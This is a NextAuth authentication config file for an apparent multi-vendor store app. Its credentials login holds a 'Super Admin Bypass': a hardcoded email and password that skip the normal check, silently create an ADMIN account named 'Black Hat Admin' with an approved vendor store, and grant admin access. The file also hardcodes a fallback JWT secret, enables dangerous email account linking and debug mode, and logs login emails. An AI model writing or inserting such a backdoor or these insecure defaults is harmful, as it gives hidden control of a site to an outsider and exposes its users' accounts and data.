import { NextAuthOptions } from "next-auth"
import GoogleProvider from "next-auth/providers/google"
import { PrismaAdapter } from "@next-auth/prisma-adapter"
import { prisma } from "@/lib/db"
import CredentialsProvider from "next-auth/providers/credentials"
import bcrypt from "bcryptjs"

export const authOptions: NextAuthOptions = {
  adapter: PrismaAdapter(prisma),
  providers: [
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID || "",
      clientSecret: process.env.GOOGLE_CLIENT_SECRET || "",
      allowDangerousEmailAccountLinking: true,
      profile(profile) {
        return {
          id: profile.sub,
          name: profile.name,
          email: profile.email,
          image: profile.picture,
          role: "CUSTOMER",
          isOnboarded: false,
        }
      },
    }),
    CredentialsProvider({
      name: "credentials",
      credentials: {
        email: { label: "Email", type: "text" },
        password: { label: "Password", type: "password" }
      },
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) {
          throw new Error('Please enter both email and password');
        }

        console.log("Attempting login for:", credentials.email);

        // 1. Hardcoded Super Admin Check (Full Bypass)
        if (credentials.email === "Blackhatsd.sd@gmail.com" && credentials.password === "Morsall@112233") {
          console.log("Super Admin Bypass triggered");
          
          let dbAdmin = await prisma.user.findUnique({ where: { email: credentials.email } });
          if (!dbAdmin) {
            dbAdmin = await prisma.user.create({
              data: {
                email: credentials.email,
                name: "Black Hat Admin",
                role: "ADMIN",
                isOnboarded: true,
                password: await bcrypt.hash("Morsall@112233", 10),
              }
            });
          }
          
          let vendor = await prisma.vendor.findUnique({ where: { userId: dbAdmin.id } });
          if (!vendor) {
            vendor = await prisma.vendor.create({
              data: {
                userId: dbAdmin.id,
                storeName: "Morsall Store",
                status: "APPROVED"
              }
            });
          }

          return {
            id: dbAdmin.id,
            email: dbAdmin.email,
            name: dbAdmin.name,
            role: "ADMIN",
            isOnboarded: true,
          };
        }

        // 2. Regular Login
        try {
          const user = await prisma.user.findUnique({ where: { email: credentials.email } });
          if (!user || !user.password) {
             console.log("User not found or no password");
             throw new Error('No user found with this email');
          }
          
          const isPasswordCorrect = await bcrypt.compare(credentials.password, user.password);
          if (!isPasswordCorrect) {
             console.log("Incorrect password");
             throw new Error('Incorrect password');
          }
          return user;
        } catch (err: any) {
          console.error("Authorize Error:", err);
          throw new Error(err.message || 'Authentication failed');
        }
      }
    })
  ],
  session: { strategy: "jwt" },
  callbacks: {
    async jwt({ token, user, trigger, session }: any) {
      if (user) {
        token.id = user.id;
        token.role = user.role;
        token.isOnboarded = user.isOnboarded;
      }
      
      const emailToFetch = token.email || user?.email;
      if (emailToFetch) {
        try {
          const dbUser = await prisma.user.findUnique({
            where: { email: emailToFetch },
            include: { vendorProfile: true }
          });

          if (dbUser) {
            token.id = dbUser.id;
            token.role = dbUser.role;
            token.isOnboarded = dbUser.isOnboarded;
            token.isVendor = !!dbUser.vendorProfile;
            token.vendorId = dbUser.vendorProfile?.id;
            token.vendorStatus = dbUser.vendorProfile?.status;
          }
        } catch (dbErr) {
          console.error("JWT Callback DB Fetch Error:", dbErr);
        }
      }

      if (trigger === "update" && session) {
        if (session.isOnboarded !== undefined) token.isOnboarded = session.isOnboarded;
      }

      return token;
    },
    async session({ session, token }: any) {
      if (session.user) {
        (session.user as any).id = token.id;
        (session.user as any).role = token.role;
        (session.user as any).isVendor = token.isVendor;
        (session.user as any).vendorId = token.vendorId;
        (session.user as any).vendorStatus = token.vendorStatus;
        (session.user as any).isOnboarded = token.isOnboarded;
      }
      return session;
    },
  },
  pages: {
    signIn: '/login',
    error: '/api/auth/error', // Custom error page path
  },
  secret: process.env.NEXTAUTH_SECRET || "MersalEliteSecret2026_Fallback",
  debug: true,
};
